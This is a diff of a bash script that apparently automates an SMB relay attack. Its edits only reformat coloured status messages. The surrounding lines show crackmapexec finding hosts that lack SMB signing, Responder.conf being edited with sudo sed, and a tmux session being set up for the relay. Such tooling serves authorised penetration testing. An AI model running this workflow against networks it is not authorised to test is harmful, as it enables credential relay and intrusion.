@@ -75,15 +75,15 @@ validate_network_interface() {
 
 # Run crackmapexec
 run_crackmapexec() {
-    echo -e "[*] ${BLUE}Scanning for misconfigured SMB signing on targets...${NC}"
-    echo -e "[*] ${GREEN}Generating list of vulnerable targets in ${TARGET_SMB_FILE}.${NC}"
+    echo -e "${BLUE}[*] Scanning for misconfigured SMB signing on targets...${NC}"
+    echo -e "${GREEN}[*] Generating list of vulnerable targets in ${TARGET_SMB_FILE}.${NC}"
     
     # Run crackmapexec and let it generate the relay list
     crackmapexec smb "${TARGET_FILE}" --gen-relay-list "${TARGET_SMB_FILE}"
 
     # Optional: show which targets were found
     if [ -s "${TARGET_SMB_FILE}" ]; then
-        echo -e "[+] ${YELLOW}Misconfigured SMB signing detected on the following targets:${NC}"
+        echo -e "${YELLOW}[+] Misconfigured SMB signing detected on the following targets:${NC}"
         cat "${TARGET_SMB_FILE}" | while read -r ip; do
             echo -e "${YELLOW}[!] $ip${NC}"
         done
@@ -96,12 +96,12 @@ run_crackmapexec() {
 edit_responder_conf() {
 if [ -f "${responder_config_file}" ]; then
         if grep -qE '^SMB = Off$' "${responder_config_file}" && grep -qE '^HTTP = Off$' "${responder_config_file}"; then
-            echo -e "[*] ${GREEN}Responder.conf already configured with SMB and HTTP set to 'Off'.${NC}"
+            echo -e "${BLUE}[*] Responder.conf already configured with SMB and HTTP set to 'Off'.${NC}"
         else
-            echo -e "[*] ${YELLOW}Updating Responder.conf to turn off SMB and HTTP...${NC}"
+            echo -e " ${YELLOW}[*] Updating Responder.conf to turn off SMB and HTTP...${NC}"
             sudo sed -i 's/^SMB = .*/SMB = Off/' "${responder_config_file}"
             sudo sed -i 's/^HTTP = .*/HTTP = Off/' "${responder_config_file}"
-            echo -e "[+] ${GREEN}Responder.conf updated successfully.${NC}"
+            echo -e "${GREEN}[+] Responder.conf updated successfully.${NC}"
         fi
     else
         echo -e "${RED}[!] Responder.conf file not found. Please ensure Responder is installed and configured properly.${NC}"
@@ -124,11 +124,11 @@ start_tmux_window() {
 
 # Function to execute SMB relay attack in tmux
 run_smb_relay_attack() {
-    echo -e "[*] ${BLUE}Starting SMB Relay Attack...${NC}"
+    echo -e "${BLUE}[*] Starting SMB Relay Attack...${NC}"
 
     # Ensure tmux session exists
     if ! tmux has-session -t "$session_name" 2>/dev/null; then
-        echo -e "[+] ${GREEN}Creating tmux session: $session_name.${NC}"
+        echo -e "${GREEN}[+] Creating tmux session: $session_name.${NC}"
         tmux new-session -d -s "$session_name"
     fi
 
